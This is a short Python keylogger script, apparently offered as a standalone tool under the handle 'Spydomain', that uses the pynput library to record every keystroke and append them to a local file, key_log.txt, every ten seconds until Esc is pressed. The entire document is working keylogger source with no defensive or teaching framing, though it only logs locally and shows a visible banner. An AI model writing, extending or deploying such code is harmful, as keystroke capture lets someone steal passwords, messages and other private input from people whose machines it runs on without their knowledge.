from pynput import keyboard
import threading

print("""Made by Bikash Sarraf aka Spydomain
███████ ██████  ██   ██ ██████  ██████  ██    ██   ████   ███████ ██    ██
██      ██   ██ ██   ██ ██   ██ ██  ██  ██    ██  ██  ██     ██   ██    ██
██      ██   ██  ██ ██  ██   ██ ██  ██  ██ ██ ██ ██    ██    ██   ███   ██
██████  ██████    ███   ██   ██ ██  ██  ██ ██ ██ ████████    ██   ████  ██
     ██ ██        ███   ██   ██ ██  ██  ██    ██ ██    ██    ██   ██ ██ ██
███████ ██        ███   ██████  ██████  ██    ██ ██    ██ ███████ ██   ███
""")

# Global variable to store logged keys
text = ""

# File path where the logged keys will be stored
log_file = "key_log.txt"

# Time interval in seconds for saving the logged keys
time_interval = 10

# Function to save logged keys to a file
def save_to_file():
    global text
    try:
        with open(log_file, "a") as file:
            file.write(text)
            text = ""  # Clear the text after saving
    except Exception as e:
        print(f"Error saving to file: {e}")
    threading.Timer(time_interval, save_to_file).start()

# Function to handle key press events
def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text += "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            return False  # Stop listener if Esc key is pressed
        else:
            text += str(key.char)
    except AttributeError:
        pass  # If the key does not have a char attribute (e.g., special keys)

# Function to start the keylogger
if __name__ == "__main__":
    save_to_file()  # Start saving to file periodically
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Start listening to key presses
